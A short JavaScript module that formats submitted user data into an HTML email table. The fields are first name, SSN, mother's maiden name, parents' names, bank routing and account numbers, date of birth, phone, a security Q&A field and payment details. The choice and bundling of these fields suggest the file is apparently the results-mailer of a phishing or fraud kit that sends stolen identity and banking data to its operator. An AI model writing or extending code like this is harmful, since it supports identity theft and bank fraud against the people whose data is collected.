// emailTemplate.js

export default function emailTemplate(data) {
  const {
    fname,
    ssn,
    mailAddress,
    fathersFname,
    mothersFname,
    mothersMname,
    city,
    state,
    amount,
    routing,
    account,
    phone_number,
    QA,
    dob,
    dateOfPayment,
  } = data;

  // Construct email message using HTML table structure
  const emailMessage = `
    <html>
      <head>
        <style>
          table {
            border-collapse: collapse;
            width: 100%;
          }
          th, td {
            border: 1px solid #dddddd;
            text-align: left;
            padding: 8px;
          }
          th {
            background-color: #f2f2f2;
          }
        </style>
      </head>
      <body>
        <h2>User Information</h2>
        <table>
          <tr>
            <th>Field</th>
            <th>Value</th>
          </tr>
          <tr>
            <td>First Name</td>
            <td>${fname}</td>
          </tr>
          <tr>
            <td>SSN</td>
            <td>${ssn}</td>
          </tr>
          <tr>
            <td>Email Address</td>
            <td>${mailAddress}</td>
          </tr>
          <tr>
            <td>Father's Name</td>
            <td>${fathersFname}</td>
          </tr>
          <tr>
            <td>Mother's Name</td>
            <td>${mothersFname}</td>
          </tr>
          <tr>
            <td>Mother's maiden Name</td>
            <td>${mothersMname}</td>
          </tr>
          <tr>
            <td>City</td>
            <td>${city}</td>
          </tr>
          <tr>
            <td>State</td>
            <td>${state}</td>
          </tr>
          <tr>
            <td>Amount</td>
            <td>${amount}</td>
          </tr>
          <tr>
            <td>Routing</td>
            <td>${routing}</td>
          </tr>
          <tr>
            <td>Account</td>
            <td>${account}</td>
          </tr>
          <tr>
            <td>Phone Number</td>
            <td>${phone_number}</td>
          </tr>
          <tr>
            <td>QA</td>
            <td>${QA}</td>
          </tr>
          <tr>
            <td>Date of Birth</td>
            <td>${dob}</td>
          </tr>
          <tr>
            <td>Date of Payment</td>
            <td>${dateOfPayment}</td>
          </tr>
        </table>
      </body>
    </html>
  `;

  return emailMessage;
}

